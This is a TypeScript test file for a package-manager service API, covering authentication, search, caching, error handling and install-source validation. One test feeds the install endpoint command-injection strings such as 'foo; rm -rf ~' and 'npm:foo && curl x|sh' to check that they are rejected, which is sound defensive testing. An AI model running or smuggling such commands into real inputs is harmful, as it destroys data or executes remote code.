import { describe, it, expect } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createApp, type Deps } from "../src/service.ts";
import { saveUpdates } from "../src/watcher.ts";
import { saveCatalog } from "../src/catalog.ts";
import type { Installer, Pkg, PkgInfo, Registry, SearchPage } from "../src/ports.ts";

class FakeRegistry implements Registry {
	searchCalls = 0;
	lastQuery = "";
	lastLimit = 0;
	constructor(
		private results: Pkg[] = [],
		private total = 0,
		private failWith?: string,
	) {}
	async search(query: string, limit: number): Promise<SearchPage> {
		this.searchCalls++;
		this.lastQuery = query;
		this.lastLimit = limit;
		if (this.failWith) throw new Error(this.failWith);
		return { results: this.results, total: this.total };
	}
	async searchPage(): Promise<SearchPage> {
		return { results: this.results, total: this.total };
	}
	async searchAll(): Promise<import("../src/ports.ts").Pkg[]> {
		return this.results;
	}
	async info(name: string): Promise<PkgInfo> {
		return { name, version: "1.0.0" };
	}
}

class FakeInstaller implements Installer {
	gotSource = "";
	removed = "";
	output = "ok";
	fail = false;
	async install(source: string): Promise<string> {
		this.gotSource = source;
		if (this.fail) throw new Error("exit 1\nnpm ERR! 404");
		return this.output;
	}
	async remove(source: string): Promise<string> {
		this.removed = source;
		return this.output;
	}
}

function deps(over: Partial<Deps> = {}): Deps {
	return {
		reg: new FakeRegistry(),
		inst: new FakeInstaller(),
		token: "test-token",
		stateDir: mkdtempSync(join(tmpdir(), "packed-")),
		...over,
	};
}

const auth = { authorization: "Bearer test-token" };

describe("service app", () => {
	it("GET /health", async () => {
		const app = createApp(deps());
		const res = await app.fetch(new Request("http://x/health", { headers: auth }));
		expect(res.status).toBe(200);
		expect((await res.json() as any).ok).toBe(true);
	});

	it("requires bearer token", async () => {
		const app = createApp(deps());
		for (const headers of [{}, { authorization: "Bearer wrong" }] as Record<string, string>[]) {
			const res = await app.fetch(new Request("http://x/health", { headers }));
			expect(res.status).toBe(401);
		}
	});

	it("GET /search scopes query and clamps limit", async () => {
		const reg = new FakeRegistry([{ name: "pi-lsp", version: "0.3.0" }], 42);
		const app = createApp(deps({ reg }));
		const res = await app.fetch(new Request("http://x/search?q=lsp&limit=999", { headers: auth }));
		expect(res.status).toBe(200);
		expect(reg.lastQuery).toBe("keywords:pi-package lsp");
		expect(reg.lastLimit).toBe(50);
		const body = await res.json() as any;
		expect(body.total).toBe(42);
		expect(body.results[0].name).toBe("pi-lsp");
	});

	it("caches GET responses (second call skips upstream)", async () => {
		const reg = new FakeRegistry([{ name: "x", version: "1" }], 1);
		const app = createApp(deps({ reg }));
		for (let i = 0; i < 2; i++) {
			await app.fetch(new Request("http://x/search?q=cache", { headers: auth }));
		}
		expect(reg.searchCalls).toBe(1);
	});

	it("upstream error → 502 with message", async () => {
		const reg = new FakeRegistry([], 0, "registry down");
		const app = createApp(deps({ reg }));
		const res = await app.fetch(new Request("http://x/search?q=boom", { headers: auth }));
		expect(res.status).toBe(502);
		expect(await res.text()).toContain("registry down");
	});

	it("GET /info", async () => {
		const app = createApp(deps());
		const res = await app.fetch(new Request("http://x/info?name=pi-lsp", { headers: auth }));
		expect(res.status).toBe(200);
		expect((await res.json() as any).name).toBe("pi-lsp");
	});

	it("POST /install rejects invalid sources", async () => {
		const inst = new FakeInstaller();
		const app = createApp(deps({ inst }));
		for (const source of ["foo; rm -rf ~", "npm:foo && curl x|sh", "$(whoami)", "", "npm:"]) {
			const res = await app.fetch(
				new Request("http://x/install", {
					method: "POST",
					headers: { ...auth, "content-type": "application/json" },
					body: JSON.stringify({ source }),
				}),
			);
			expect(res.status).toBe(400);
		}
		expect(inst.gotSource).toBe("");
	});

	it("POST /install accepts valid sources, reports failures in-band", async () => {
		const inst = new FakeInstaller();
		const app = createApp(deps({ inst }));
		for (const source of ["npm:foo", "npm:@scope/pkg@1.2.3", "git:github.com/u/r@v1", "https://github.com/u/r"]) {
			const res = await app.fetch(
				new Request("http://x/install", {
					method: "POST",
					headers: { ...auth, "content-type": "application/json" },
					body: JSON.stringify({ source }),
				}),
			);
			expect(res.status).toBe(200);
			expect((await res.json() as any).ok).toBe(true);
		}
		expect(inst.gotSource).toBe("https://github.com/u/r");

		inst.fail = true;
		const res = await app.fetch(
			new Request("http://x/install", {
				method: "POST",
				headers: { ...auth, "content-type": "application/json" },
				body: JSON.stringify({ source: "npm:missing" }),
			}),
		);
		expect(res.status).toBe(200);
		const body = await res.json() as any;
		expect(body.ok).toBe(false);
		expect(body.output).toContain("npm ERR! 404");
	});

	it("GET /updates serves the watcher snapshot", async () => {
		const d = deps();
		await saveUpdates(d.stateDir, {
			checkedAt: new Date().toISOString(),
			updates: [{ name: "a", installed: "1", latest: "2", detectedAt: "" }],
		});
		const app = createApp(d);
		const res = await app.fetch(new Request("http://x/updates", { headers: auth }));
		expect(res.status).toBe(200);
		expect((await res.json() as any).updates[0].latest).toBe("2");
	});

	it("GET /catalog serves the sync snapshot", async () => {
		const d = deps();
		await saveCatalog(d.stateDir, {
			fetchedAt: new Date().toISOString(),
			packages: [{ name: "a", version: "1" }],
		});
		const app = createApp(d);
		const res = await app.fetch(new Request("http://x/catalog", { headers: auth }));
		expect(res.status).toBe(200);
		expect((await res.json() as any).packages[0].name).toBe("a");
	});
});
